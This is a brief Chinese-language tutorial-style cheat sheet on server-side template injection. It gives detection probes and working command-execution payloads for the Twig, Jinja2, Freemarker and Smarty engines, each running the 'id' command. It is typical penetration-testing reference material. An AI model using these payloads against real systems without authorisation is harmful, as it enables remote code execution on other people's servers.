# 服务端模板注入 (SSTI)

## 概述

服务端模板注入（Server-Side Template Injection，SSTI）是指用户输入被拼接到模板语言中渲染，从而可能导致代码执行。常见于如 `Hello {{name}}` 的场景。

## 探测 Payload

使用下列通用 Payload 检查是否存在 SSTI：

```
{{7*7}}
${7*7}
#{7*7}
{{'a'.toUpperCase()}}
```

若页面返回计算结果（例如 `49`）或对应的函数执行结果，则说明存在模板注入。

## 漏洞利用（命令执行）

根据目标使用的模板引擎，选择对应的 Payload 实现命令执行。

### Twig (PHP)

```php
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
```
> 说明：`registerUndefinedFilterCallback` 将未定义的过滤器回调指向 `exec`，随后 `getFilter` 执行系统命令 `id`。

### Jinja2 (Python)

```python
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```
> 说明：通过 `config` 对象访问全局命名空间的 `os` 模块，执行 `popen` 并读取输出。

### Freemarker (Java)

```java
${'freemarker.template.utility.Execute'?new()('id')}
```
> 说明：利用 Freemarker 的 `Execute` 宏执行系统命令。

### Smarty (PHP)

```smarty
{system('id')}
```
> 说明：Smarty 支持直接调用 PHP 函数 `system` 进行命令执行。

**注意**：实际利用时需根据目标环境的过滤规则、禁用函数或安全策略选择合适的过滤器或函数。不同模板引擎的防护机制可能导致上述 Payload 失效，请针对性调试。